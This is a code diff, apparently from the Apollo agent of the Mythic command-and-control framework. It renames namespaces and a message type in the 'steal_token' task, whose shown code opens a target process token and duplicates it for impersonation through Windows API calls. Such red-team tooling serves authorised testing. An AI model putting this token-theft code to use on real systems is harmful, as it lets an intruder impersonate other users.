@@ -6,10 +6,10 @@
 
 #if STEAL_TOKEN
 
-using PhantomInterop.Classes;
-using PhantomInterop.Classes.Api;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Classes.Api;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
@@ -35,7 +35,7 @@ namespace Tasks
         private DuplicateTokenEx _pDuplicateTokenEx;
         private CloseHandle _pCloseHandle;
 
-        public steal_token(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public steal_token(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _pOpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
             _pDuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
@@ -62,7 +62,7 @@ namespace Tasks
             if (procHandle != IntPtr.Zero)
             {
                 _agent.GetTaskManager().AddTaskResponseToQueue(
-                    CreateTaskResponse("", false, "", new ICommandMessage[]
+                    CreateTaskResponse("", false, "", new IMythicMessage[]
                     {
                         Artifact.ProcessOpen(int.Parse(_data.Parameters))
                     }));
@@ -82,7 +82,7 @@ namespace Tasks
                         TokenAccessLevels.MaximumAllowed,
                         IntPtr.Zero,
                         TokenImpersonationLevel.Impersonation,
-                        1, 
+                        1, // TokenImpersonation
                         out hImpersonationToken);
                     if (!bRet)
                     {
